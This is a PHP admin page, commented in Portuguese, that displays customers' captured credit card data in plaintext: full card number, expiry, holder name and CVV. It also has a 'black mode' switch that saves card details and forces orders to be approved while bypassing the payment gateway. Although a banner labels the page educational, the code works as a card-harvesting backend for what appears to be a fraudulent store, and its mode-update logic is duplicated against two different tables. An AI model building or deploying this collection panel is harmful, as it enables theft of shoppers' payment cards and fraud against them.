<?php
// admin_panel/dados.php
session_start();
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: admin_login.php');
    exit;
}

require_once '../config/db.php'; // Conexão com o DB
require_once '../funcoes.php'; // Para formatar datas

$pedidos_com_cartao = [];
$message = '';
$message_type = '';
$checkout_security_mode = 'white'; // Default

// ==========================================================
// LÓGICA DE EXCLUSÃO (DELETE)
// ==========================================================
if (isset($_GET['delete_card'])) {
    $pedido_id_to_delete = (int)$_GET['delete_card'];
    try {
        // Limpa apenas a coluna de dados do cartão, mantendo o pedido
        $sql_del = "UPDATE pedidos SET dev_card_data = NULL WHERE id = :id";
        $stmt_del = $pdo->prepare($sql_del);
        $stmt_del->execute(['id' => $pedido_id_to_delete]);
        $_SESSION['flash_message'] = "Dados do cartão do Pedido #{$pedido_id_to_delete} foram removidos.";
        $_SESSION['flash_type'] = "success";
    } catch (PDOException $e) {
        $_SESSION['flash_message'] = "Erro ao remover dados: " . $e->getMessage();
        $_SESSION['flash_type'] = "error";
    }
    header("Location: dados.php");
    exit;
}

if (isset($_GET['delete_all'])) {
    try {
        $sql_del_all = "UPDATE pedidos SET dev_card_data = NULL WHERE dev_card_data IS NOT NULL";
        $stmt_del_all = $pdo->prepare($sql_del_all);
        $stmt_del_all->execute();
        $count = $stmt_del_all->rowCount();
        $_SESSION['flash_message'] = "Todos os {$count} registros de dados de cartão foram removidos com sucesso.";
        $_SESSION['flash_type'] = "success";
    } catch (PDOException $e) {
        $_SESSION['flash_message'] = "Erro ao remover todos os dados: " . $e->getMessage();
        $_SESSION['flash_type'] = "error";
    }
    header("Location: dados.php");
    exit;
}


// ==========================================================
// ATUALIZAR MODO DE SEGURANÇA
// ==========================================================
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['salvar_modo_seguranca'])) {
    $novo_modo = $_POST['checkout_security_mode'] === 'black' ? 'black' : 'white';

    try {
        $sql_update_mode = "UPDATE config_site SET valor = :valor, atualizado_em = NOW() WHERE chave = 'checkout_security_mode'";
        $stmt_update = $pdo->prepare($sql_update_mode);
        $stmt_update->execute([':valor' => $novo_modo]);

        $message = "Modo de segurança atualizado para: " . strtoupper($novo_modo);
        $message_type = ($novo_modo === 'black') ? 'error' : 'success'; // "Erro" de propósito se for 'black'

    } catch (PDOException $e) {
        $message = "Erro ao atualizar o modo de segurança: " . $e->getMessage();
        $message_type = "error";
    }
    // Define a variável local para refletir a mudança imediatamente
    $checkout_security_mode = $novo_modo;
}


// ==========================================================
// LÓGICA DE LEITURA
// ==========================================================
try {
    // 1. Busca os pedidos com cartão (e o ID do usuário para o link)
    $sql = "SELECT
                p.id,
                p.criado_em,
                p.dev_card_data,
                u.id AS usuario_id,
                u.nome AS nome_usuario,
                u.email AS email_usuario
            FROM pedidos p
            JOIN usuarios u ON p.usuario_id = u.id
            WHERE p.dev_card_data IS NOT NULL AND p.dev_card_data != ''
            ORDER BY p.criado_em DESC"; // Organizado por data (o mais novo primeiro)

    $stmt = $pdo->prepare($sql);
    $stmt->execute();
    $pedidos_com_cartao = $stmt->fetchAll(PDO::FETCH_ASSOC);

    // ==========================================================
    // ATUALIZAR MODO DE SEGURANÇA
    // ==========================================================
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['salvar_modo_seguranca'])) {
        $novo_modo = $_POST['checkout_security_mode'] === 'black' ? 'black' : 'white';

        try {
            // CORREÇÃO: Altera de config_site para config_api
            // A tabela config_api já possui a coluna 'atualizado_em' por definição.
            $sql_update_mode = "UPDATE config_api SET valor = :valor, atualizado_em = NOW() WHERE chave = 'checkout_security_mode'";
            $stmt_update = $pdo->prepare($sql_update_mode);
            $stmt_update->execute([':valor' => $novo_modo]);

            $message = "Modo de segurança atualizado para: " . strtoupper($novo_modo);
            $message_type = ($novo_modo === 'black') ? 'error' : 'success'; // "Erro" de propósito se for 'black'

        } catch (PDOException $e) {
            $message = "Erro ao atualizar o modo de segurança: " . $e->getMessage();
            $message_type = "error";
        }
        // Define a variável local para refletir a mudança imediatamente
        $checkout_security_mode = $novo_modo;
    }

} catch (PDOException $e) {
    $message = "Erro ao consultar dados: " . $e->getMessage();
    $message_type = "error";
    error_log("Erro em dados.php: " . $e->getMessage());
}

// Pega mensagens flash da sessão (após redirects de exclusão)
if (isset($_SESSION['flash_message']) && empty($message)) {
    $message = $_SESSION['flash_message'];
    $message_type = $_SESSION['flash_type'] ?? 'info';
    unset($_SESSION['flash_message'], $_SESSION['flash_type']);
}

$current_page = basename($_SERVER['PHP_SELF']);
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dados de Cartão Capturados (Debug) - Admin</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>

    <style>
        /* ==========================================================
            CSS COMPLETO DO PAINEL ADMIN (Baseado no layout existente)
            ========================================================== */
          :root {
              --primary-color: #4a69bd; --secondary-color: #6a89cc; --text-color: #f9fafb;
              --light-text-color: #9ca3af; --border-color: rgba(255, 255, 255, 0.1); --background-color: #111827;
              --sidebar-color: #1f2937; --glass-background: rgba(31, 41, 55, 0.7);
              --success-bg: rgba(40, 167, 69, 0.3); --success-text: #c3e6cb;
              --error-bg: rgba(220, 53, 69, 0.3); --error-text: #f5c6cb;
              --info-bg: rgba(0, 123, 255, 0.2); --info-text: #bee5eb;
              --warning-bg: rgba(255, 193, 7, 0.2); --warning-text: #ffeeba;
              --danger-color: #e74c3c; --danger-color-hover: #c0392b;
              --sidebar-width: 240px; --border-radius: 8px;
              --box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
          }
          * { margin: 0; padding: 0; box-sizing: border-box; }
          body { font-family: 'Poppins', sans-serif; background-color: var(--background-color); color: var(--text-color); display: flex; min-height: 100vh; overflow-x: hidden; line-height: 1.6;}
          #particles-js { position: fixed; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; opacity: 0.6; }
          a { color: var(--primary-color); text-decoration: none; transition: color 0.2s ease;} a:hover { color: var(--secondary-color); text-decoration: underline;}

          /* --- Sidebar --- */
          .sidebar { width: var(--sidebar-width); background-color: var(--sidebar-color); height: 100vh; position: fixed; left: 0; top: 0; padding: 1.5rem; display: flex; flex-direction: column; border-right: 1px solid var(--border-color); z-index: 1000; transition: transform 0.3s ease; box-shadow: var(--box-shadow); }
          .sidebar .logo-area { display: flex; flex-direction: column; align-items: center; margin-bottom: 1rem; } .sidebar .logo-circle { width: 50px; height: 50px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 0.5rem; box-shadow: 0 0 10px rgba(74, 105, 189, 0.6); overflow: hidden; background-color: #fff; } .sidebar .logo-circle svg { color: var(--primary-color); width: 24px; height: 24px; } .sidebar .logo-text { font-size: 1rem; font-weight: 600; color: var(--text-color); text-align: center; } .sidebar .divider { width: 100%; height: 1px; background-color: var(--border-color); margin: 1rem 0; } .sidebar nav { flex-grow: 1; } .sidebar nav a { display: flex; align-items: center; gap: 0.8rem; padding: 0.8rem 1rem; color: var(--light-text-color); text-decoration: none; border-radius: var(--border-radius); margin-bottom: 0.5rem; transition: all 0.3s ease; border: 1px solid transparent; background-color: transparent; } .sidebar nav a:hover, .sidebar nav a.active { background-color: var(--glass-background); color: var(--text-color); border-color: var(--primary-color); box-shadow: 0 2px 8px rgba(74, 105, 189, 0.4); } .sidebar nav a svg { width: 20px; height: 20px; flex-shrink: 0; } .user-profile { position: relative; margin-top: auto; background-color: var(--glass-background); padding: 0.75rem; border-radius: var(--border-radius); display: flex; align-items: center; gap: 1rem; cursor: pointer; border: 1px solid var(--border-color); transition: all 0.3s ease; } .user-profile:hover { border-color: var(--primary-color); } .avatar { width: 35px; height: 35px; border-radius: 50%; background-color: var(--primary-color); display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: 0.9rem; } .user-info .user-name { font-weight: 600; font-size: 0.85rem; line-height: 1.2; } .user-info .user-level { font-size: 0.7rem; color: var(--light-text-color); } .profile-dropdown { position: absolute; bottom: calc(100% + 10px); left: 0; width: 100%; background-color: #2c3a4f; border-radius: var(--border-radius); border: 1px solid var(--border-color); padding: 0.5rem; z-index: 20; visibility: hidden; opacity: 0; transform: translateY(10px); transition: all 0.3s ease; } .profile-dropdown.show { visibility: visible; opacity: 1; transform: translateY(0); } .profile-dropdown a { display: flex; gap: 0.75rem; padding: 0.75rem; color: var(--light-text-color); font-size: 0.85rem; border-radius: 6px; } .profile-dropdown a:hover { background-color: var(--glass-background); color: var(--text-color); }
          .sidebar nav .sidebar-submenu { padding-left: 20px; margin-top: -5px; margin-bottom: 5px; overflow: hidden; transition: max-height 0.3s ease-out; max-height: 0; } .sidebar nav .sidebar-submenu.open { max-height: 500px; } .sidebar nav a.has-children { display: flex; justify-content: space-between; align-items: center; } .sidebar nav a .menu-chevron { width: 16px; height: 16px; color: var(--light-text-color); transition: transform 0.3s ease; } .sidebar nav a.open .menu-chevron { transform: rotate(90deg); }

          /* --- Conteúdo Principal --- */
          .main-content { margin-left: var(--sidebar-width); flex-grow: 1; padding: 2rem 2.5rem; min-height: 100vh; overflow-y: auto; transition: margin-left 0.3s ease, width 0.3s ease; width: calc(100% - var(--sidebar-width)); }
          .content-header { margin-bottom: 2rem; background: var(--glass-background); padding: 1.5rem 2rem; border-radius: var(--border-radius); border: 1px solid var(--border-color); backdrop-filter: blur(5px); }
          .content-header h1 { font-size: 1.8rem; font-weight: 600; color: var(--primary-color); margin: 0 0 0.25rem 0; }
          .content-header p { font-size: 1rem; color: var(--light-text-color); margin: 0; }

          /* --- Seções CRUD --- */
          .crud-section { margin-bottom: 2.5rem; }
          .crud-section h3 {
              font-size: 1.25rem; color: var(--text-color); margin-bottom: 1.25rem;
              padding-bottom: 0.5rem; border-bottom: 1px solid var(--border-color); font-weight: 600;
              display: flex; justify-content: space-between; align-items: center;
          }
          .list-container, .form-container { background: var(--glass-background); padding: 1.5rem 2rem; border-radius: var(--border-radius); border: 1px solid var(--border-color); box-shadow: var(--box-shadow); margin-bottom: 2rem; backdrop-filter: blur(5px); }

          /* --- Botões (Genérico e Específico) --- */
          .btn { padding: 0.65rem 1.2rem; background-color: var(--primary-color); color: #fff; border: none; border-radius: var(--border-radius); cursor: pointer; font-weight: 600; transition: all 0.3s ease; font-size: 0.9em; display: inline-block; text-decoration: none; }
          .btn:hover { background-color: var(--secondary-color); transform: translateY(-1px); text-decoration: none; color: #fff;}
          .btn.danger, button[type="submit"].danger { background-color: var(--danger-color); }
          .btn.danger:hover, button[type="submit"].danger:hover { background-color: var(--danger-color-hover); }
          .btn.cancel { background-color: var(--light-text-color); color: var(--background-color) !important; }
          .btn.cancel:hover { background-color: #bbb; }

          .btn-delete-all {
              font-size: 0.8em;
              padding: 0.5rem 1rem;
              background-color: var(--danger-color);
              color: #fff;
              border: none;
              border-radius: var(--border-radius);
              cursor: pointer;
              transition: all 0.3s ease;
          }
          .btn-delete-all:hover { background-color: var(--danger-color-hover); }

          /* --- Formulários (para o seletor) --- */
          .form-group { margin-bottom: 1.25rem; }
          .form-group label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--light-text-color); font-size: 0.8rem; text-transform: uppercase; }
          .form-group select { width: 100%; padding: 0.65rem 0.8rem; border: 1px solid var(--border-color); border-radius: var(--border-radius); background-color: rgba(0, 0, 0, 0.3); color: var(--text-color); box-sizing: border-box; transition: border-color 0.3s ease, box-shadow 0.3s ease; font-size: 0.9em; }
          .form-group select:focus { border-color: var(--primary-color); box-shadow: 0 0 8px rgba(74, 105, 189, 0.5); outline: none; }
          button[type="submit"] { padding: 0.65rem 1.2rem; background-color: var(--primary-color); color: #fff; border: none; border-radius: var(--border-radius); cursor: pointer; font-weight: 600; transition: background-color 0.3s ease, transform 0.1s ease; font-size: 0.9em; }
          button[type="submit"]:hover { background-color: var(--secondary-color); transform: translateY(-1px); }

          /* --- NOVO: Card Grid Layout --- */
          .card-grid-container {
              display: grid;
              /* Cria colunas de no mínimo 300px, auto-ajustáveis */
              grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
              gap: 1.5rem;
          }
          .data-card {
              background: var(--sidebar-color);
              border: 1px solid var(--border-color);
              border-radius: var(--border-radius);
              box-shadow: var(--box-shadow);
              display: flex;
              flex-direction: column;
              transition: transform 0.2s ease, box-shadow 0.2s ease;
          }
          .data-card:hover {
              transform: translateY(-3px);
              box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
          }
          .card-header {
              display: flex;
              justify-content: space-between;
              padding: 0.75rem 1rem;
              border-bottom: 1px solid var(--border-color);
          }
          .pedido-id {
              font-weight: 600;
              color: var(--primary-color);
          }
          .pedido-data {
              font-size: 0.8em;
              color: var(--light-text-color);
          }
          .card-body {
              padding: 1rem;
              flex-grow: 1;
          }
          .cliente-link {
              font-weight: 600;
              font-size: 1.1em;
              color: var(--text-color);
              text-decoration: none;
          }
          .cliente-link:hover {
              color: var(--primary-color);
              text-decoration: underline;
          }
          .cliente-email {
              display: block;
              font-size: 0.85em;
              color: var(--light-text-color);
              margin-bottom: 1rem;
          }
          /* (Estilos da célula da tabela agora aplicados ao card-data-content) */
          .card-data-content {
              font-family: 'Courier New', Courier, monospace;
              background-color: rgba(220, 53, 69, 0.1);
              color: var(--error-text);
              font-size: 0.9em !important;
              white-space: pre-wrap;
              line-height: 1.7;
              padding: 0.75rem 1rem;
              border-radius: var(--border-radius);
          }
          .card-data-content strong {
              color: #fff;
              font-weight: 700;
          }
          .gateway-error {
              color: var(--warning-text);
              font-weight: 600;
              font-style: italic;
              display: block;
              margin-bottom: 8px;
              border-bottom: 1px solid var(--border-color);
              padding-bottom: 8px;
          }
          .card-footer {
              padding: 0.75rem 1rem;
              border-top: 1px solid var(--border-color);
              text-align: right;
          }
          .btn-delete {
              font-size: 0.8em;
              padding: 0.4rem 0.8rem;
              background-color: var(--danger-color);
              color: #fff;
              border: none;
              border-radius: var(--border-radius);
              cursor: pointer;
              transition: all 0.3s ease;
          }
          .btn-delete:hover { background-color: var(--danger-color-hover); }

          /* --- Mensagens --- */
          .message { padding: 1rem; border-radius: var(--border-radius); margin-bottom: 1.5rem; font-weight: 600; border: 1px solid transparent; backdrop-filter: blur(3px); }
          .message.success { background-color: var(--success-bg); color: var(--success-text); border-color: rgba(40, 167, 69, 0.5); }
          .message.error { background-color: var(--error-bg); color: var(--error-text); border-color: rgba(220, 53, 69, 0.5); }
          .message.info { background-color: var(--info-bg); color: var(--info-text); border-color: rgba(0, 123, 255, 0.4); }
          .message.warning { background-color: var(--warning-bg); color: var(--warning-text); border-color: rgba(255, 193, 7, 0.4); }

          /* --- Modal de Confirmação --- */
          .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(5px); z-index: 2000; display: none; opacity: 0; transition: opacity 0.3s ease; }
          .modal-overlay.active { display: block; opacity: 1; }
          .modal-container { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: var(--sidebar-color); border-radius: var(--border-radius); border: 1px solid var(--border-color); box-shadow: var(--box-shadow); z-index: 2001; width: 90%; max-width: 450px; opacity: 0; transform: translate(-50%, -40%) scale(0.95); transition: all 0.3s ease; }
          .modal-overlay.active .modal-container { opacity: 1; transform: translate(-50%, -50%) scale(1); }
          .modal-header { padding: 1.5rem 2rem; border-bottom: 1px solid var(--border-color); }
          .modal-header h4 { margin: 0; font-size: 1.25rem; color: var(--text-color); }
          .modal-body { padding: 2rem; }
          .modal-body p { margin: 0; color: var(--light-text-color); font-size: 0.95em; line-height: 1.7; }
          .modal-footer { padding: 1.5rem 2rem; background-color: rgba(0,0,0,0.2); border-top: 1px solid var(--border-color); border-bottom-left-radius: var(--border-radius); border-bottom-right-radius: var(--border-radius); display: flex; justify-content: flex-end; gap: 1rem; }

          /* --- Mobile / Responsivo (Layout Base) --- */
          .menu-toggle { display: none; position: fixed; top: 1rem; left: 1rem; z-index: 1003; cursor: pointer; padding: 8px; background-color: var(--sidebar-color); border-radius: var(--border-radius); border: 1px solid var(--border-color); box-shadow: var(--box-shadow);}
          .menu-toggle svg { width: 20px; height: 20px; color: var(--text-color); display: block; }

          @media (max-width: 1024px) {
              body { position: relative; }
              .sidebar { width: 280px; transform: translateX(-280px); box-shadow: 5px 0 15px rgba(0, 0, 0, 0.5); z-index: 1002; height: 100%; overflow-y: auto; }
              .menu-toggle { display: flex; }
              .main-content { margin-left: 0; width: 100%; padding: 1.5rem; padding-top: 5rem; min-width: unset; }
              body.sidebar-open .sidebar { transform: translateX(0); }
              body.sidebar-open::after { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.7); z-index: 1001; backdrop-filter: blur(2px);}
          }

          @media (max-width: 768px) {
              /* A grid já é responsiva por padrão (auto-fit) */
          }

          @media (max-width: 576px) {
              .main-content { padding: 1rem; padding-top: 4.5rem; }
              .content-header { padding: 1rem 1.5rem;}
              .content-header h1 { font-size: 1.5rem; }
              .content-header p { font-size: 0.9rem;}
              .form-container, .list-container { padding: 1rem 1.5rem;}
              .crud-section h3 { font-size: 1.1rem; flex-direction: column; align-items: flex-start; gap: 10px; }
              .card-grid-container { grid-template-columns: 1fr; } /* Força 1 coluna em telas muito pequenas */

              /* Responsividade Modal */
              .modal-container { width: 95%; }
              .modal-header, .modal-body, .modal-footer { padding: 1.25rem 1.5rem; }
              .modal-footer { flex-direction: column-reverse; gap: 0.75rem; }
              .modal-footer .btn { width: 100%; text-align: center; }
          }
    </style>
</head>
<body>

    <div class="modal-overlay" id="confirmation-modal">
        <div class="modal-container">
            <div class="modal-header">
                <h4 id="modal-title">Confirmar Exclusão</h4>
            </div>
            <div class="modal-body">
                <p id="modal-text">Você tem certeza que deseja prosseguir?</p>
            </div>
            <div class="modal-footer">
                <button class="btn cancel" id="modal-cancel">Cancelar</button>
                <a href="#" class="btn danger" id="modal-confirm-link">Confirmar</a>
            </div>
        </div>
    </div>

    <div class="menu-toggle" id="menu-toggle"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5" /></svg></div>
    <div id="particles-js"></div>

    <?php include 'admin_sidebar.php'; ?>

    <main class="main-content">
        <div class="content-header">
            <h1>Dados de Cartão Coletados (Debug)</h1>
            <p>Visualização dos dados de cartão salvos em texto puro (JSON).</p>
        </div>

        <?php if (!empty($message)): ?>
            <div class="message <?php echo $message_type; ?>"><?php echo nl2br(htmlspecialchars($message)); ?></div>
        <?php endif; ?>

        <div class="message error" style="border-color: var(--danger-color); background: rgba(220, 53, 69, 0.3); color: #f5c6cb;">
            <h4 style="color: #fff; margin-top: 0;">⚠️ AVISO DE SEGURANÇA CRÍTICO (Propósito Educacional)</h4>
            <p style="color: #f5c6cb; font-size: 0.9em; line-height: 1.6;">
                Esta página existe <strong>apenas</strong> para fins educacionais e de demonstração.
                <br>
                <strong>NUNCA armazene o número completo do cartão ou o CVV em um banco de dados em um site real.</strong>
            </p>
        </div>

        <div class="crud-section" id="section-modo-seguranca">
            <h3>Controle do Modo de Demonstração (Segurança)</h3>
            <div class="form-container">
                <form action="dados.php" method="POST">
                    <div class="form-group">
                        <label for="checkout_security_mode">Modo do Checkout de Cartão de Crédito</label>
                        <select name="checkout_security_mode" id="checkout_security_mode">
                            <option value="white" <?php echo ($checkout_security_mode === 'white') ? 'selected' : ''; ?>>
                                Modo White (Seguro - Padrão)
                            </option>
                            <option value="black" <?php echo ($checkout_security_mode === 'black') ? 'selected' : ''; ?>>
                                Modo Black (Inseguro - Demonstração)
                            </option>
                        </select>
                        <p style="font-size: 0.9em; color: var(--light-text-color); margin-top: 10px;">
                            <strong>Modo White (Seguro):</strong> A API chama o gateway e respeita a resposta (aprovado/recusado).<br>
                            <strong>Modo Black (Inseguro):</strong> A API valida o Luhn, salva os dados do cartão e **força a aprovação** do pedido, ignorando o gateway.
                        </p>
                    </div>
                    <button type="submit" name="salvar_modo_seguranca" class="<?php echo ($checkout_security_mode === 'black') ? 'danger' : ''; ?>">
                        <?php echo ($checkout_security_mode === 'black') ? 'Salvar (Modo Inseguro Ativo)' : 'Salvar (Modo Seguro Ativo)'; ?>
                    </button>
                </form>
            </div>
        </div>


        <div class="crud-section" id="section-pedidos">
            <h3>
                Pedidos com Dados de Cartão Capturados
                <button type="button" class="btn-delete-all" onclick="openDeleteAllModal()">
                    Excluir Todos os Dados
                </button>
            </h3>

            <div class="card-grid-container">
                <?php if (empty($pedidos_com_cartao)): ?>
                    <p style="text-align: center; color: var(--light-text-color); padding: 2rem;">Nenhum dado de cartão capturado encontrado.</p>
                <?php else: ?>
                    <?php foreach ($pedidos_com_cartao as $pedido): ?>
                        <?php
                            // 1. Decodifica o JSON salvo no banco
                            $cartao_dados_raw = json_decode($pedido['dev_card_data'], true);

                            // 2. Prepara variáveis
                            $nome = 'N/A'; $numero = 'N/A'; $mes = 'N/A';
                            $ano = 'N/A'; $cvv = 'N/A'; $erro_gateway = null;

                            if ($cartao_dados_raw) {
                                // 3. Verifica se é a ESTRUTURA DE ERRO
                                if (isset($cartao_dados_raw['DADOS_ENVIADOS'])) {
                                    $erro_gateway = $cartao_dados_raw['ERRO_GATEWAY'] ?? 'Erro desconhecido';
                                    $dados = $cartao_dados_raw['DADOS_ENVIADOS']; // Pega o sub-array
                                } else {
                                    // É a ESTRUTURA DE SUCESSO
                                    $dados = $cartao_dados_raw;
                                }

                                // 4. Preenche os dados
                                $nome = $dados['holder_name'] ?? 'N/A';
                                $numero = $dados['number'] ?? 'N/A';
                                $mes = $dados['exp_month'] ?? 'N/A';
                                $ano = $dados['exp_year'] ?? 'N/A';
                                $cvv = $dados['cvv'] ?? 'N/A';
                            }
                        ?>
                        <div class="data-card">
                            <div class="card-header">
                                <span class="pedido-id">Pedido #<?php echo $pedido['id']; ?></span>
                                <span class="pedido-data"><?php echo formatarDataHoraBR($pedido['criado_em']); ?></span>
                            </div>
                            <div class="card-body">
                                <a href="usuarios.php?view_user=<?php echo $pedido['usuario_id']; ?>" class="cliente-link" title="Ver perfil do usuário">
                                    <?php echo htmlspecialchars($pedido['nome_usuario']); ?>
                                </a>
                                <span class="cliente-email"><?php echo htmlspecialchars($pedido['email_usuario']); ?></span>

                                <div class="card-data-content">
                                    <?php if ($erro_gateway): ?>
                                        <span class="gateway-error">Falha no Gateway: <?php echo htmlspecialchars($erro_gateway); ?></span>
                                    <?php endif; ?>

                                    <strong>Nome:</strong> <?php echo htmlspecialchars($nome); ?><br>
                                    <strong style="color: var(--danger-color);">Número:</strong> <?php echo htmlspecialchars($numero); ?><br>
                                    <strong>Validade:</strong> <?php echo htmlspecialchars($mes); ?>/<?php echo htmlspecialchars($ano); ?><br>
                                    <strong style="color: var(--danger-color);">CVV:</strong> <?php echo htmlspecialchars($cvv); ?>
                                </div>
                            </div>
                            <div class="card-footer">
                                <button type="button" class="btn-delete" onclick="openDeleteModal('<?php echo $pedido['id']; ?>')">
                                    Excluir
                                </button>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
    </main>

    <script>
        // --- JavaScript para Partículas ---
        // MANTIDO: Inicializa a biblioteca particlesJS para o fundo animado
        particlesJS('particles-js', {"particles":{"number":{"value":60,"density":{"enable":true,"value_area":800}},"color":{"value":"#4a69bd"},"shape":{"type":"circle"},"opacity":{"value":0.4,"random":false},"size":{"value":3,"random":true},"line_linked":{"enable":true,"distance":150,"color":"#ffffff","opacity":0.1,"width":1},"move":{"enable":true,"speed":1.5,"direction":"none","random":false,"straight":false,"out_mode":"out","bounce":false}},"interactivity":{"detect_on":"canvas","events":{"onhover":{"enable":true,"mode":"repulse"},"onclick":{"enable":true,"mode":"push"},"resize":true}},"retina_detect":true});

        // --- JavaScript Geral (DOMContentLoaded) ---
        document.addEventListener('DOMContentLoaded', () => {

            // A Lógica de Menu, Perfil e Submenus foi removida, pois está centralizada no admin_sidebar.php

            // --- Lógica do Modal de Confirmação ---
            const modalOverlay = document.getElementById('confirmation-modal');
            const modalTitle = document.getElementById('modal-title');
            const modalText = document.getElementById('modal-text');
            const modalConfirmLink = document.getElementById('modal-confirm-link');
            const modalCancel = document.getElementById('modal-cancel');

            // Função Global para abrir modal de exclusão de cartão por Pedido
            window.openDeleteModal = function(pedidoId) {
                if (modalOverlay) {
                    modalTitle.innerText = "Excluir Dados do Pedido #" + pedidoId;
                    modalText.innerHTML = "Você tem certeza que deseja apagar permanentemente os dados do cartão associados a este pedido?<br><br>**Esta ação não pode ser desfeita.**";
                    modalConfirmLink.href = "dados.php?delete_card=" + pedidoId;
                    modalConfirmLink.classList.remove('update');
                    modalConfirmLink.classList.add('danger');
                    modalOverlay.classList.add('active');
                }
            }

            // Função Global para abrir modal de exclusão de TODOS os dados
            window.openDeleteAllModal = function() {
                if (modalOverlay) {
                    modalTitle.innerText = "Excluir TODOS os Dados";
                    modalText.innerHTML = "Você tem certeza que deseja apagar permanentemente **TODOS** os dados de cartão capturados em **TODOS** os pedidos?<br><br>**Esta ação é irreversível.**";
                    modalConfirmLink.href = "dados.php?delete_all=true";
                    modalConfirmLink.classList.remove('update');
                    modalConfirmLink.classList.add('danger');
                    modalOverlay.classList.add('active');
                }
            }

            // Função Global para fechar o modal
            window.closeModal = function() {
                if (modalOverlay) { modalOverlay.classList.remove('active'); }
            }

            if (modalOverlay) {
                // Fecha ao clicar no botão 'Cancelar'
                if (modalCancel) modalCancel.addEventListener('click', closeModal);

                // Fecha ao clicar fora do modal (overlay)
                modalOverlay.addEventListener('click', function(e) {
                    if (e.target === modalOverlay) { closeModal(); }
                });
            }

        });
    </script>
</body>
</html>